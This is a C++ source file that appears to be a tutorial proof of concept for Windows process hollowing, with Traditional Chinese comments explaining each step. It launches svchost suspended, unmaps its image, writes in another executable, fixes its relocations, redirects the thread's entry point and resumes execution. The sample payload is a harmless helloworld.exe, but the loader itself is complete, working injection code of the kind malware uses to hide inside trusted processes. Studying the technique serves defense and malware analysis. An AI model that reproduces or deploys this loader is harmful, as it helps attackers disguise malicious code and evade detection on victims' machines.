// ProcessHollowing.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{
	// 1. 建立一個 Suspended Process，它就是要被注入的目標 Process
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	
	// 第六個參數必須是 CREATE_SUSPENDED，因為需要它維持在初始狀態，讓我們能夠對其中的記憶體進行修改
	CreateProcessA
	(
		0,
		pDestCmdLine,		
		0, 
		0, 
		0, 
		CREATE_SUSPENDED, 
		0, 
		0, 
		pStartupInfo, 
		pProcessInfo
	);
	if (!pProcessInfo->hProcess)
	{
		printf("Error creating process\r\n");

		return;
	}
	
	// 取得 PEB，裡面包含後面步驟需要用到的 ImageBaseAddress
	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);


	// 2. 讀取要注入的檔案
	HANDLE hFile = CreateFileA
	(
		pSourceFile,
		GENERIC_READ, 
		0, 
		0, 
		OPEN_ALWAYS, 
		0, 
		0
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error opening %s\r\n", pSourceFile);
		return;
	}
	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

	// 取得 File Header 和 Optional Header
	// File Header 和 Optional Header 各是 NT Header 的其中一個成員，NT Header 則是從 DOS Header 算出來的
	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);


	// 3. Unmap 目標 Process 的記憶體
	// 從 ntdll.dll 中取出 NtUnmapViewOfSection
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
	_NtUnmapViewOfSection NtUnmapViewOfSection =
		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
	DWORD dwResult = NtUnmapViewOfSection
	(
		pProcessInfo->hProcess, 
		pPEB->ImageBaseAddress
	);
	if (dwResult)
	{
		printf("Error unmapping section\r\n");
		return;
	}

	
	// 4. 在目標 Process 申請一塊記憶體
	// Process 是目標 Process 的 Handle
	// lpAddress 是原本被 Unmap 的 Image 的 Base Address
	// dwSize 是我們要注入的檔案大小
	// flAllocationType　是　MEM_COMMIT | MEM_RESERVE
	// flProtect 可以針對不同的記憶體區段去做配置，不過 POC 方便起見，直接用 PAGE_EXECUTE_READWRITE
	PVOID pRemoteImage = VirtualAllocEx
	(
		pProcessInfo->hProcess,
		pPEB->ImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed\r\n");
		return;
	}


	// 5. 把 Header 寫入目標 Process
	// 在改 Optional Header 中的 ImageBase 成員之前，算出檔案的 Image Base 和目標 Process 的 Image Base 的距離
	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

	// 把我們的檔案 Header 寫入目標 Process
	if (!WriteProcessMemory
	(
		pProcessInfo->hProcess, 				
		pPEB->ImageBaseAddress, 
		pBuffer, 
		pSourceHeaders->OptionalHeader.SizeOfHeaders, 
		0
	))
	{
		printf("Error writing process memory\r\n");
		return;
	}
	
	/* 以上是薛丁格的 Process (上) 的內容 */
	/* 以下是薛丁格的 Process (下) 的內容 */

	// 6. 把各 Section 根據它們的 RVA 寫入目標 Process
	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		// Section 在記憶體的實際位址 = Image Base + Section 的 RVA
		PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
		if (!WriteProcessMemory
		(
			pProcessInfo->hProcess,			
			pSectionDestination,			
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0
		))
		{
			printf ("Error writing process memory\r\n");
			return;
		}
	}	

	// 7. Rebase Relocation Table，因為 Image Base 可能會不一樣
	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			// 確認 Section Name 是否為 .reloc
			char* pSectionName = ".reloc";		
			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			// Relocation Table 結構可以透過在 Optional Table 中的 DataDirectory 成員取得
			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			// 迴圈跑過所有 Block
			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				// 迴圈跑過所有 Entry
				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					// 當 Type 為 0 時代表它只是用來做 Padding 對齊用的，所以不用改
					if (pBlocks[y].Type == 0)
						continue;

					// 把每個 Entry 的 Offset 加上所在的 Block 的 PageAddress，
					// 將算出來的位址裡的值加上原本目標 Process 和檔案的 Image Base 的差
					DWORD dwFieldAddress = 
						pBlockheader->PageAddress + pBlocks[y].Offset;
					DWORD dwBuffer = 0;
					ReadProcessMemory
					(
						pProcessInfo->hProcess, 
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);
					dwBuffer += dwDelta;
					BOOL bSuccess = WriteProcessMemory
					(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);
					if (!bSuccess)
					{
						printf("Error writing memory\r\n");
						continue;
					}
				}
			}
			break;
		}

	//  8. 取出目標 Process 的 Context，把暫存器 EAX 改成我們注入的程式的 Entry Point
	DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error getting context\r\n");
		return;
	}
	pContext->Eax = dwEntrypoint;
	if (!SetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error setting context\r\n");
		return;
	}

	// 9. 恢復執行原本狀態為 Suspended 的目標 Process
	if (!ResumeThread(pProcessInfo->hThread))
	{
		printf("Error resuming thread\r\n");
		return;
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	char* pPath = new char[MAX_PATH];
	GetModuleFileNameA(0, pPath, MAX_PATH);
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	strcat(pPath, "helloworld.exe");
	CreateHollowedProcess
	(
		"svchost", 
		pPath
	);
	system("pause");
	return 0;
}